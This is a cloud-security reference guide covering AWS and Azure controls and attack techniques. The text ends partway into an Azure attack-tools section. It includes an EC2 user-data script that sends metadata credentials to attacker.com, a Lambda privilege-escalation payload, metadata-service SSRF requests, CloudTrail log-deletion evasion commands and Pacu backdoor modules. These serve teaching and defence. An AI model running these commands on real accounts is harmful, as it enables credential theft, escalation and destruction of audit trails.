# Cloud Security Reference Library

> Comprehensive cybersecurity reference for AWS, Azure, GCP, multi-cloud attack tooling, IAM, data security, CNAPP, and compliance. Maintained by TeamStarWolf.

---

## Table of Contents

1. [AWS Security Fundamentals](#_1-aws-security-fundamentals)
2. [AWS Attack Techniques](#_2-aws-attack-techniques)
3. [Azure Security](#_3-azure-security)
4. [Azure Attack Techniques](#_4-azure-attack-techniques)
5. [GCP Security](#_5-gcp-security)
6. [Multi-Cloud Attack Tools](#_6-multi-cloud-attack-tools)
7. [Cloud IAM Security & Least Privilege](#_7-cloud-iam-security-amp-least-privilege)
8. [Cloud Data Security](#_8-cloud-data-security)
9. [Cloud Native Security (CNAPP)](#_9-cloud-native-security-cnapp)
10. [Serverless, DevSecOps & Cloud Compliance](#_10-serverless-devsecops-amp-cloud-compliance)

---

## 1. AWS Security Fundamentals

### 1.1 IAM Core Concepts

**Identity and Access Management (IAM)** is the foundational access control plane for AWS. Every API call is authorized through IAM.

#### Policy Types and Evaluation Order

| Policy Type | Scope | Precedence |
|---|---|---|
| Service Control Policy (SCP) | AWS Organizations (OU/Account) | Guardrail — overrides identity policies |
| Permission Boundary | IAM principal (user/role) | Maximum permissions ceiling |
| Identity-based Policy | User, Group, Role | Grant permissions |
| Resource-based Policy | S3, KMS, Lambda, SQS, etc. | Cross-account access |
| Session Policy | Temporary credentials (AssumeRole) | Further restrict session |
| ACL | S3, VPC | Legacy cross-account |

**Evaluation logic** (simplified):
1. Explicit DENY anywhere → DENY
2. SCP does not ALLOW → DENY (implicit)
3. Permission boundary does not ALLOW → DENY
4. Resource-based policy ALLOWs → ALLOW (same account)
5. Identity-based policy ALLOWs → ALLOW
6. Default → DENY

#### IAM Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "ExampleAllow",
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": ["arn:aws:s3:::my-bucket", "arn:aws:s3:::my-bucket/*"],
    "Condition": {
      "StringEquals": {"aws:RequestedRegion": "us-east-1"},
      "Bool": {"aws:SecureTransport": "true"}
    }
  }]
}
```

**Key condition operators**: `StringEquals`, `StringLike` (wildcards), `ArnLike`, `IpAddress`, `Bool`, `DateGreaterThan`, `NumericLessThan`, `Null`, `ForAllValues:StringEquals`, `ForAnyValue:StringLike`

**Global condition keys**: `aws:PrincipalArn`, `aws:SourceIp`, `aws:SourceVpc`, `aws:SourceVpce`, `aws:RequestedRegion`, `aws:MultiFactorAuthPresent`, `aws:TokenIssueTime`, `aws:PrincipalOrgID`, `aws:PrincipalTag/<key>`, `aws:ResourceTag/<key>`, `aws:CalledVia`

#### IAM Roles

- **Assumed** via `sts:AssumeRole` — returns temporary credentials (AccessKeyId, SecretAccessKey, SessionToken, Expiration)
- **Trust policy** (resource-based policy on the role) controls who can assume it
- **Session duration**: 1 hour default, up to 12 hours (configurable)
- **Role chaining**: each hop resets max session to 1 hour
- **Service roles**: trusted by AWS services (ec2.amazonaws.com, lambda.amazonaws.com, etc.)
- **Cross-account roles**: principal in Account A assumes role in Account B

#### Service Control Policies (SCPs)

SCPs are applied at AWS Organizations level. They define the **maximum permissions** for accounts in an OU.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "DenyLeaveOrganization",
    "Effect": "Deny",
    "Action": "organizations:LeaveOrganization",
    "Resource": "*"
  }]
}
```

Common SCP patterns:
- Deny actions outside approved regions (`aws:RequestedRegion` condition)
- Deny disabling CloudTrail (`cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`)
- Deny root account usage (`aws:PrincipalType: Root`)
- Deny creating IAM users (enforce SSO/IdP)
- Deny public S3 buckets (`s3:PutBucketPublicAccessBlock` deny with condition)

#### Permission Boundaries

A permission boundary is an IAM managed policy attached to an IAM entity that sets the **maximum permissions** that identity-based policies can grant. Used to delegate permission management safely.

```bash
# Attach permission boundary to role
aws iam create-role --role-name DevRole \
  --permissions-boundary arn:aws:iam::123456789012:policy/DevBoundary \
  --assume-role-policy-document file://trust.json
```

#### IAM Access Analyzer

- **Purpose**: Identify resources shared with external entities (outside account/org)
- **Resource types analyzed**: S3 buckets, IAM roles, KMS keys, Lambda functions/layers, SQS queues, Secrets Manager secrets
- **Finding types**: `Public`, `CrossAccount`, `CrossOrganization`, `ThirdParty`
- **Policy validation**: Checks policies against IAM best practices (security warnings, errors, suggestions)
- **Policy generation**: Learns from CloudTrail to suggest least-privilege policies
- **Unused access analyzer**: Identifies unused roles, permissions, and access keys (IAM Access Analyzer for unused access)

```bash
# List findings
aws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/MyAnalyzer
# Validate policy
aws accessanalyzer validate-policy --policy-document file://policy.json --policy-type IDENTITY_POLICY
```

---

### 1.2 AWS Organizations & Control Tower

**AWS Organizations** provides hierarchical account management:
- **Management account** (formerly master): creates and manages member accounts
- **Organizational Units (OUs)**: logical groupings (e.g., Prod OU, Dev OU, Security OU)
- **SCPs**: applied to OUs and accounts (not management account)

**AWS Control Tower** builds a landing zone with:
- **Guardrails** (now called Controls): preventive (SCPs), detective (AWS Config rules), proactive (CloudFormation hooks)
- **Account Factory**: standardized account vending via Service Catalog
- **Log Archive account**: centralized CloudTrail and Config logs
- **Audit account**: security tooling (Security Hub, GuardDuty aggregator)
- **Customizations for Control Tower (CfCT)**: GitOps-style customization pipeline

---

### 1.3 AWS Config

**AWS Config** continuously records resource configurations and evaluates against rules.

| Rule Type | Description |
|---|---|
| AWS Managed Rules | Pre-built (s3-bucket-public-read-prohibited, iam-password-policy, etc.) |
| Custom Lambda Rules | Custom evaluation logic |
| Custom Policy Rules (Guard) | CloudFormation Guard DSL |

Key managed rules:
- `iam-root-access-key-check` — root account has no access keys
- `mfa-enabled-for-iam-console-access` — MFA required
- `s3-bucket-server-side-encryption-enabled`
- `encrypted-volumes` — EBS volumes encrypted
- `rds-instance-public-access-check`
- `cloudtrail-enabled`
- `vpc-flow-logs-enabled`
- `access-keys-rotated` — keys rotated within 90 days

**Config Aggregator**: Collects data across accounts/regions for centralized compliance view.

**Conformance Packs**: Collections of Config rules deployed as a unit (CIS, PCI, NIST templates available).

---

### 1.4 CloudTrail

**CloudTrail** records API calls (management events and data events).

| Event Type | Description | Default |
|---|---|---|
| Management Events | Control plane (CreateBucket, RunInstances, etc.) | Enabled (free for first copy) |
| Data Events | Data plane (S3 GetObject, Lambda Invoke, DynamoDB operations) | Disabled (extra cost) |
| Insights Events | Unusual API activity detection | Disabled (extra cost) |

```bash
# Look up events (past 90 days in console)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
# Query with CloudTrail Lake (SQL)
aws cloudtrail start-query --query-statement "SELECT * FROM EDS_ID WHERE eventName='AssumeRole' AND errorCode IS NOT NULL"
```

**Security considerations**:
- Enable multi-region trail and log file validation (`--enable-log-file-validation`)
- Send logs to dedicated S3 bucket with bucket policy denying delete/modify
- Enable S3 Object Lock (WORM) on log bucket
- Send to CloudWatch Logs for real-time alerting
- Encrypt with KMS CMK

---

### 1.5 GuardDuty

GuardDuty is a managed threat detection service using ML, anomaly detection, and threat intelligence.

**Finding categories and examples**:

| Category | Example Finding | Description |
|---|---|---|
| Backdoor | `Backdoor:EC2/C&CActivity.B` | EC2 communicating with known C2 |
| Behavior | `Behavior:EC2/NetworkPortUnusual` | Unusual network port activity |
| CryptoCurrency | `CryptoCurrency:EC2/BitcoinTool.B` | Mining tool communication |
| Discovery | `Discovery:S3/MaliciousIPCaller` | S3 enumeration from malicious IP |
| Exfiltration | `Exfiltration:S3/ObjectRead.Unusual` | Unusual S3 read activity |
| Impact | `Impact:EC2/WinRMBruteForce` | Brute force attack |
| InitialAccess | `InitialAccess:IAM/AnomalousBehavior` | Anomalous IAM console login |
| Persistence | `Persistence:IAM/UserCreated` | New IAM user created |
| Policy | `Policy:S3/BucketPublicAccessGranted` | S3 made public |
| PrivilegeEscalation | `PrivilegeEscalation:IAM/AnomalousBehavior` | Suspicious permission escalation |
| Recon | `Recon:IAM/MaliciousIPCaller` | IAM enumeration from malicious IP |
| Stealth | `Stealth:IAMUser/CloudTrailLoggingDisabled` | CloudTrail disabled |
| UnauthorizedAccess | `UnauthorizedAccess:IAM/ConsoleLoginSuccess.B` | Unusual console login |

**GuardDuty data sources**: VPC Flow Logs, DNS query logs, CloudTrail management events, CloudTrail S3 data events (S3 Protection), EKS audit logs (EKS Protection), Lambda network activity (Lambda Protection), RDS login activity, Runtime monitoring (EC2/ECS/EKS agent-based)

---

### 1.6 Security Hub

Aggregates findings from GuardDuty, Inspector, Macie, IAM Access Analyzer, Firewall Manager, and third-party tools. Evaluates against security standards.

**Supported standards**:
- **AWS Foundational Security Best Practices (FSBP)**: AWS-specific controls
- **CIS AWS Foundations Benchmark**: v1.2, v1.4, v3.0
- **PCI DSS**: v3.2.1, v4.0
- **NIST SP 800-53**: Rev 5
- **SOC 2**

**Finding format**: AWS Security Finding Format (ASFF) — standardized JSON schema.

---

### 1.7 Amazon Detective, Macie, Inspector v2

**Detective**: Graph-based investigation tool. Analyzes VPC Flow Logs, CloudTrail, GuardDuty findings. Builds behavior baselines. Use for: pivot analysis, IP/role activity summaries, GuardDuty finding investigation.

**Macie**: ML-based sensitive data discovery in S3. Detects PII (names, SSNs, credit cards, credentials). Creates findings with severity. Managed data identifiers (100+ built-in) + custom data identifiers (regex + keywords).

**Inspector v2**: Vulnerability management for EC2, Lambda, and ECR.
- EC2: OS package vulnerabilities (CVE database), network reachability
- Lambda: software composition analysis, code scanning
- ECR: container image scanning on push/continuously
- Risk score = CVSS score + network reachability + exploitability intelligence

---

### 1.8 WAF v2, Shield Advanced

**AWS WAF v2**:
- Attached to ALB, CloudFront, API Gateway, AppSync, Cognito, Verified Access
- **Web ACL**: collection of rules evaluated in priority order
- **Rule groups**: reusable rule collections (AWS Managed, marketplace, custom)
- **Rule types**: rate-based, regex match, SQL injection match, XSS match, geo match, IP set, byte match, size constraint
- **AWS Managed Rule Groups**: Core Rule Set (CRS), Known Bad Inputs, SQL database, Linux, POSIX, PHP, WordPress, IP reputation, Bot Control, Account Takeover Prevention (ATP), Fraud Control - Account Creation Fraud Prevention (ACFP)
- **Logging**: to CloudWatch Logs, S3, Kinesis Data Firehose

**Shield Standard** (automatic, free): L3/L4 DDoS protection for all AWS customers.

**Shield Advanced** (paid): Enhanced L3/L4/L7 protection, Shield Response Team (SRT) access, attack diagnostics, cost protection for scaling during attacks. Attach to: CloudFront, Route53, ALB, ELB Classic, EIP, Global Accelerator.

---

### 1.9 VPC Security

#### Security Groups vs NACLs

| Feature | Security Groups | NACLs |
|---|---|---|
| Level | Instance (ENI) | Subnet |
| Statefulness | Stateful (return traffic auto-allowed) | Stateless (explicit inbound+outbound rules) |
| Rules | Allow only | Allow and Deny |
| Evaluation | All rules evaluated | Rules evaluated in order (lowest number first) |
| Default | Deny all inbound, allow all outbound | Allow all in/out |

#### VPC Flow Logs

Capture IP traffic for VPC, subnet, or ENI. Fields: `version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes windowstart windowend action flow-direction log-status`

Custom format fields include: `vpc-id`, `subnet-id`, `instance-id`, `tcp-flags`, `type`, `pkt-srcaddr`, `pkt-dstaddr`, `region`, `az-id`, `sublocation-type`, `sublocation-id`, `pkt-src-aws-service`, `pkt-dst-aws-service`, `traffic-path`

**Traffic-path values**: 1=through IGW, 2=through VGW, 3=Direct Connect, 4=VPC peering, 5=NAT gateway, 6=VPC endpoint, 7=Egress-only IGW, 8=Internet

#### PrivateLink (VPC Endpoints)

| Type | Description |
|---|---|
| Interface Endpoint (PrivateLink) | ENI in subnet, private IP, supports most services + third-party |
| Gateway Endpoint | Route table entry, S3 and DynamoDB only (free) |
| Gateway Load Balancer Endpoint | Inline traffic inspection |

**Endpoint policies**: Resource-based policy controlling which principals/actions allowed through endpoint. Used to restrict S3 access to specific buckets from VPC.

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::my-approved-bucket/*"
  }]
}
```

---

## 2. AWS Attack Techniques

### 2.1 IAM Privilege Escalation Paths

Privilege escalation in AWS occurs when an attacker with limited permissions gains additional capabilities. Below are documented escalation paths.

#### Direct Privilege Escalation

| Technique | Required Permission | Result |
|---|---|---|
| `iam:CreatePolicyVersion` | Set new default policy version | Add admin permissions to existing policy |
| `iam:SetDefaultPolicyVersion` | Switch to older version with higher privs | Revert to permissive version |
| `iam:CreateAccessKey` | On any user | Gain credentials of that user |
| `iam:CreateLoginProfile` | On any user without password | Console access as that user |
| `iam:UpdateLoginProfile` | On any user | Change password, assume identity |
| `iam:AttachUserPolicy` | Any user + any policy | Attach AdministratorAccess to self |
| `iam:AttachRolePolicy` | Any role | Attach admin policy to assumable role |
| `iam:PutUserPolicy` | Any user | Add inline policy with admin perms |
| `iam:AddUserToGroup` | Any group | Join admin group |

#### PassRole-Based Escalation

`iam:PassRole` is required to assign a role to an AWS service. Combined with service-creation permissions, it enables escalation.

**Lambda vector** (most common):
```bash
# Requirements: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# (or lambda:CreateEventSourceMapping for async trigger)
aws lambda create-function \
  --function-name escalate \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

aws lambda invoke --function-name escalate output.json
```

Lambda payload to create admin user:
```python
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
```

**EC2 vector**:
```bash
# Requirements: iam:PassRole + ec2:RunInstances + ec2:DescribeInstances
# Launch EC2 with admin instance profile, use userdata to exfil credentials
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds
curl -X POST https://attacker.com/creds -d @/tmp/creds'
```

**Other PassRole vectors**: CloudFormation (cfn:CreateStack), Glue (glue:CreateJob), SageMaker (sagemaker:CreateTrainingJob), CodeBuild (codebuild:CreateProject), ECS (ecs:RegisterTaskDefinition + ecs:RunTask), Data Pipeline (datapipeline:CreatePipeline)

#### Additional Escalation Paths

```
sts:AssumeRole → assume any role listed in trust policy
iam:UpdateAssumeRolePolicy → modify trust policy to add self as principal
iam:CreateRole + iam:AttachRolePolicy → create new admin role, assume it
codestar:CreateProject → creates roles with elevated permissions
```

---

### 2.2 IMDSv1 SSRF Attacks vs IMDSv2

#### IMDSv1 (Vulnerable)

EC2 Instance Metadata Service available at `http://169.254.169.254/`. IMDSv1 accepts unauthenticated GET requests — any application with SSRF can query it.

**Classic SSRF attack**:
```bash
# Attacker exploits SSRF in web app to fetch credentials
curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name, then:
curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

**Key endpoints**:
```
http://169.254.169.254/latest/meta-data/                              # metadata root
http://169.254.169.254/latest/meta-data/iam/security-credentials/    # role name
http://169.254.169.254/latest/meta-data/iam/info                     # instance profile ARN
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/... # instance identity
http://169.254.169.254/latest/user-data                               # userdata (may have secrets)
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/dynamic/instance-identity/document     # account ID, region, instance ID
```

#### IMDSv2 (Hardened)

Requires a session-oriented token. Token request uses PUT method with `X-aws-ec2-metadata-token-ttl-seconds` header — most SSRF vulnerabilities can only make GET requests, blocking exploitation.

```bash
# Legitimate IMDSv2 usage
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Enforce IMDSv2**:
```bash
# At instance launch
aws ec2 run-instances --metadata-options "HttpTokens=required,HttpEndpoint=enabled"
# On existing instance
aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
# SCP / Config rule to enforce
# Config rule: ec2-imdsv2-check
```

**Bypass scenarios**: WAF/proxy in same VPC, open redirects followed by metadata server, SSRF via XML external entity (XXE) that supports redirects.

---

### 2.3 S3 Misconfiguration Types

| Misconfiguration | Risk | Detection |
|---|---|---|
| Public bucket ACL (public-read/public-read-write) | Data exposure/modification | S3 Public Access Block, Macie, IAM Access Analyzer |
| Bucket policy grants `s3:GetObject` to `*` | Data exposure | IAM Access Analyzer |
| No block public access settings | Future misconfiguration risk | AWS Config: `s3-account-level-public-access-blocks` |
| No encryption at rest | Data exposure on breach | AWS Config: `s3-bucket-server-side-encryption-enabled` |
| No versioning | Ransomware vulnerability | AWS Config: `s3-bucket-versioning-enabled` |
| No MFA delete | Log tampering | Manual check |
| Overly permissive CORS | Cross-origin data theft | ScoutSuite, Prowler |
| Pre-signed URL with excessive TTL | Prolonged exposure | Review pre-signed URL expiration policies |
| Replication to attacker-controlled bucket | Data exfiltration | CloudTrail: PutBucketReplication |
| Server access logging disabled | No audit trail | AWS Config: `s3-bucket-logging-enabled` |

---

### 2.4 CloudTrail Evasion Techniques

```bash
# Disable CloudTrail (detectable via GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled)
aws cloudtrail stop-logging --name MyTrail
aws cloudtrail delete-trail --name MyTrail

# Delete log files (if S3 permissions allow)
aws s3 rm s3://cloudtrail-bucket/AWSLogs/ --recursive

# Minimize API footprint: use read-only APIs (many not logged by default)
aws iam get-role --role-name Target       # Management event — logged
aws s3api get-object --bucket b --key k  # Data event — only logged if enabled

# Operate via console (some actions may have different log formats)
# Use legitimate services that generate less scrutiny
# Timing: perform actions during high-volume periods to blend in

# CloudTrail Lake / Athena queries to search for evasion attempts
# Detect: StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors with exclusions
```

---

### 2.5 Cross-Account Attacks

**Confused Deputy**: Service A has permissions to access Service B. Attacker tricks A into performing actions on B on their behalf.

**Resource-based policy abuse**: If a resource policy has `"Principal": "*"` or overly broad condition, external principals can directly access.

**Role trust policy misconfiguration**:
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "*"},
  "Action": "sts:AssumeRole",
  "Condition": {"StringEquals": {"sts:ExternalId": "12345"}}
}
```
External ID should be treated as a shared secret — do not publish it.

**Supply chain**: Compromise software/AMI/container image used by target account.

---

### 2.6 AWS Exploitation Frameworks

#### Pacu

Open-source AWS exploitation framework (Rhino Security Labs).

```bash
# Install
pip install pacu
# OR git clone https://github.com/RhinoSecurityLabs/pacu && cd pacu && pip install -r requirements.txt
pacu

# Key modules
run iam__enum_permissions                    # Enumerate caller permissions
run iam__enum_users_roles_policies_groups    # Enumerate all IAM entities
run iam__privesc_scan                        # Scan for privilege escalation paths
run ec2__enum                               # Enumerate EC2 instances, SGs, VPCs
run s3__enum                                # Enumerate S3 buckets + ACLs
run iam__backdoor_users_keys                # Create backdoor access keys
run lambda__backdoor_new_roles              # Backdoor new roles via event bridge
run cloudtrail__download_event_history      # Download CloudTrail events
run iam__detect_honeytokens                 # Check if using canary credentials
run ebs__enum_snapshots_unauth              # Find public EBS snapshots
run cognito__attack                         # Cognito user pool attacks
```

#### Other Tools

**enumerate-iam**: Brute-force which AWS permissions a credential set has.
```bash
python enumerate-iam.py --access-key AKIA... --secret-key xxx
# Tests ~500+ API calls across all services
```

**aws_consoler**: Converts temporary AWS credentials to console login URL (useful for demonstrating impact).
```bash
python aws_consoler.py -a ASIA... -s xxx -t SessionToken
# Returns: https://signin.aws.amazon.com/federation?Action=login&...
```

**weirdAAL** (AWS Attack Library): Categorized attack modules for reconnaissance, lateral movement.

**CloudSploit**: Open-source CSPM — 500+ security checks across AWS, Azure, GCP, Oracle.
```bash
node index.js --cloud aws --csv report.csv
```

**Prowler**: Multi-cloud security tool (see Section 6).

**SkyArk**: Identifies shadow admin users and roles in AWS.

**Principal Mapper (PMapper)**: Analyzes IAM to find privilege escalation paths as a graph.
```bash
pmapper --profile default graph create
pmapper --profile default analysis --suggest
```

---

## 3. Azure Security

### 3.1 Microsoft Entra ID (formerly Azure AD)

#### Conditional Access Policies

Conditional Access is the policy engine for Zero Trust access control in Entra ID. Policies are evaluated for every authentication request.

**Policy structure**:
- **Assignments (Conditions)**: Who, What, Where, When, How
- **Access Controls (Grant/Block/Session)**: What happens

**Conditions**:

| Condition | Options |
|---|---|
| Users and groups | All users, specific users/groups, guest users, service principals |
| Cloud apps or actions | All apps, specific apps, user actions (register security info) |
| Conditions → Sign-in risk | Low, Medium, High (requires Entra ID P2) |
| Conditions → User risk | Low, Medium, High (requires Entra ID P2) |
| Conditions → Device platforms | Android, iOS, Windows, macOS, Linux |
| Conditions → Locations | Named locations (IP ranges, countries), MFA trusted IPs |
| Conditions → Client apps | Browser, mobile/desktop apps, Exchange ActiveSync, legacy auth clients |
| Conditions → Filter for devices | Device attributes (compliant, hybrid joined, etc.) |

**Grant Controls**:
- Require MFA
- Require device to be marked as compliant (Intune)
- Require hybrid Azure AD joined device
- Require approved client app
- Require app protection policy
- Require password change (for risky users)
- Require authentication strength (phishing-resistant MFA)

**Session Controls**:
- Sign-in frequency (re-authentication interval)
- Persistent browser session (disable "Stay signed in")
- Cloud app security — real-time monitoring
- Disable resilience defaults

**Common CA policy patterns**:
```
Policy: Block Legacy Authentication
- Conditions: Client apps = Exchange ActiveSync + Other clients
- Grant: Block access

Policy: Require MFA for Admins
- Conditions: Users = Directory Roles (Global Admin, etc.)
- Grant: Require MFA + Require phishing-resistant auth strength

Policy: Require Compliant Device for Corporate Apps
- Conditions: Cloud apps = All cloud apps
- Grant: Require device compliant OR Hybrid AD joined
```

#### Privileged Identity Management (PIM)

JIT (Just-In-Time) privileged access management for Entra ID roles and Azure RBAC roles.

**Key concepts**:
- **Eligible**: User can activate the role when needed (not permanently assigned)
- **Active**: User has the role right now
- **Activation**: Self-service via portal/API, may require MFA + justification + approval
- **Time-bound**: Assignments have start/end dates
- **Approval workflow**: Designated approvers must approve activation requests
- **Access reviews**: Periodic review of role assignments (who still needs access?)

```powershell
# Activate PIM role (PowerShell)
$ActivationParams = @{
    PrincipalId = (Get-MgContext).Account
    RoleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin
    DirectoryScopeId = "/"
    Action = "selfActivate"
    ScheduledDateTime = (Get-Date -AsUTC).ToString("o")
    Justification = "Emergency incident response"
}
New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest @ActivationParams
```

#### Identity Governance

**Access Reviews**: Periodic certification of group memberships, app assignments, role assignments.
- Reviewers: resource owner, members themselves, designated reviewers, managers
- Auto-apply results: remove access if no response / deny
- Frequency: weekly, monthly, quarterly, semi-annual, annual

**Entitlement Management**: Access packages — bundles of resources (groups, apps, SharePoint sites) with governance policies.
- Internal users: self-service request, approval workflow
- External users (B2B): guest access with expiration
- Connected organizations: trusted external directories

**Lifecycle Workflows**: Automate identity lifecycle tasks (joiner/mover/leaver).

---

### 3.2 Azure RBAC Hierarchy

```
Tenant (Entra ID)
└── Management Group (MG)
    └── Management Group (nested, up to 6 levels)
        └── Subscription
            └── Resource Group
                └── Resource
```

**Scope inheritance**: Permissions assigned at higher scope inherit downward (Management Group → Subscription → Resource Group → Resource).

**Built-in roles**:

| Role | Scope | Permissions |
|---|---|---|
| Owner | Any | Full control including access management |
| Contributor | Any | Create/manage resources, no access management |
| Reader | Any | View resources only |
| User Access Administrator | Any | Manage user access (RBAC) |
| Storage Blob Data Owner | Storage | Full blob access including POSIX ACL |
| Storage Blob Data Contributor | Storage | Read/write/delete blobs |
| Key Vault Administrator | Key Vault | All key vault data plane operations |
| Virtual Machine Contributor | VMs | Create/manage VMs, no access to VNet/Storage |
| Network Contributor | Networking | Manage networks, no access to other resources |

**Custom role definition**:
```json
{
  "Name": "Custom VM Operator",
  "IsCustom": true,
  "Description": "Can start/stop VMs only",
  "Actions": ["Microsoft.Compute/virtualMachines/start/action",
               "Microsoft.Compute/virtualMachines/deallocate/action",
               "Microsoft.Compute/virtualMachines/read"],
  "NotActions": [],
  "DataActions": [],
  "NotDataActions": [],
  "AssignableScopes": ["/subscriptions/00000000-1111-2222-3333-444444444444"]
}
```

---

### 3.3 Microsoft Defender for Cloud

**Secure Score**: Percentage of security recommendations implemented. Recommendations grouped by controls, each with max score points.

**Workload Protections (Defender Plans)**:

| Plan | Coverage |
|---|---|
| Defender for Servers | P1: EDR integration; P2: Vulnerability assessment, JIT VM access, adaptive controls |
| Defender for Containers | Container registries, Kubernetes clusters, container images |
| Defender for Storage | Malware scanning, sensitive data detection, activity anomalies |
| Defender for SQL | Azure SQL, SQL on VM, Synapse — threat detection + vulnerability assessment |
| Defender for App Service | Web app threats, dangling DNS detection |
| Defender for Key Vault | Unusual access patterns, suspicious operations |
| Defender for Resource Manager | ARM layer attacks, Azure management API anomalies |
| Defender for DNS | DNS-based attacks, suspicious DNS queries |
| Defender for APIs | API discovery, threat detection, posture |
| Defender for DevOps | Code scanning, IaC scanning, secret scanning in pipelines |

**JIT VM Access** (Defender for Servers P2):
- Locks down management ports (RDP 3389, SSH 22, WinRM 5985/5986) with NSG deny rules
- On-demand request opens port for specific source IP for limited time
- Audit trail in activity log

---

### 3.4 Microsoft Sentinel

Cloud-native SIEM/SOAR.

**Data connectors**: Azure Activity, Entra ID, Microsoft 365 Defender, Defender for Cloud, AWS CloudTrail, GCP Pub/Sub, Syslog, CEF, custom REST API.

**Key components**:
- **Analytics rules**: Scheduled (KQL queries), NRT (near real-time), ML behavior analytics, Fusion (multi-stage attack detection), Microsoft security (alerts from Defender products)
- **Workbooks**: Dashboards built on Azure Monitor Workbooks (KQL)
- **Playbooks**: Logic Apps automations triggered by alerts/incidents
- **UEBA**: User and Entity Behavior Analytics — baseline + anomaly scoring
- **Threat Intelligence**: TAXII feeds, upload indicators, Microsoft TI

**KQL example**:
```kql
SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType != 0  // Failed logins
| summarize FailCount = count() by UserPrincipalName, IPAddress
| where FailCount > 10
| join kind=inner (
    SigninLogs | where ResultType == 0  // Successful login
) on UserPrincipalName
| project UserPrincipalName, IPAddress, FailCount
```

---

### 3.5 Azure Policy

**Effects** (in evaluation order):

| Effect | Description |
|---|---|
| Disabled | Policy rule ignored |
| Audit | Logs non-compliant resources, no enforcement |
| AuditIfNotExists | Audit if related resource doesn't exist |
| Append | Add fields to resource request |
| Modify | Add/replace/remove tags/properties |
| Deny | Block non-compliant resource creation/modification |
| DenyAction | Block specific resource actions (e.g., delete) |
| DeployIfNotExists | Deploy related resource if not present (e.g., deploy diagnostic settings) |

**Initiative**: Collection of policies assigned together (e.g., Azure Security Benchmark initiative).

---

### 3.6 Azure Key Vault

**Access models**:
- **RBAC** (recommended): Azure RBAC roles control data plane (Key Vault Secrets Officer, Key Vault Crypto User, etc.)
- **Access Policies** (legacy): Vault-level permissions for Get/List/Set/Delete operations on keys/secrets/certificates

**Soft delete**: Deleted items retained for 7-90 days (default 90), recoverable. **Cannot be disabled once enabled.**

**Purge protection**: Prevents permanent deletion during retention period. Required for BYOK/CMK compliance.

**Key types**: RSA (2048/3072/4096-bit), EC (P-256/P-384/P-521/SECP256K1), oct-HSM (AES keys in HSM).

**Key operations**: encrypt, decrypt, wrapKey, unwrapKey, sign, verify, import, backup, restore, rotate, release (Secure Key Release for confidential computing).

**Certificate management**: Auto-renewal with DigiCert/GlobalSign/Let's Encrypt integration.

---

### 3.7 Managed Identities & Azure AD Connect

**System-assigned Managed Identity**: Tied to resource lifecycle. Created/deleted with the resource. Cannot be shared.

**User-assigned Managed Identity**: Independent lifecycle. Can be assigned to multiple resources. Recommended for shared identity scenarios.

```bash
# Assign managed identity role
az role assignment create \
  --assignee <managed-identity-client-id> \
  --role "Storage Blob Data Reader" \
  --scope /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Storage/storageAccounts/<account>

# Use managed identity in application (no credentials stored)
from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient
credential = ManagedIdentityCredential()
client = SecretClient(vault_url="https://myvault.vault.azure.net/", credential=credential)
```

**Azure AD Connect security**:
- Runs on-premises, syncs AD to Entra ID
- **Password Hash Sync (PHS)**: Hash of hash synced to cloud — attacker with AD Connect access can extract NTLM hashes or perform DCSync equivalent
- **Pass-through Authentication (PTA)**: Auth agent on-prem processes auth — compromise of PTA agent = ability to authenticate as any user
- **Federation (ADFS)**: Token signing certificate theft = forge tokens for any user (Golden SAML attack)
- **AD Connect account** (MSOL_xxxxx): Has high privileges in AD — protect this account
- **PHS account**: Has DCSync rights (DS-Replication-Get-Changes-All) — monitor for abuse

---

## 4. Azure Attack Techniques

### 4.1 ROADtools

ROADtools is an open-source framework for Azure AD/Entra ID reconnaissance and analysis.

```bash
# Install
pip install roadtools

# Authenticate and gather data
roadrecon auth -u user@contoso.com -p Password1    # Username/password
roadrecon auth --device-code                        # Device code flow
roadrecon auth -t <tenant-id> --tokens tokens.json # With existing tokens

# Gather all Azure AD objects
roadrecon gather                                    # Default: uses token from auth step
roadrecon gather --mfa-required                     # Gather even with MFA
roadrecon gather -d db.db                          # Custom database name

# Launch GUI
roadrecon-gui                                       # Opens web interface at http://localhost:5000
roadrecon-gui --no-browser -d db.db               # Custom db, no auto-open

# Key data gathered:
# Users, Groups, Applications, Service Principals
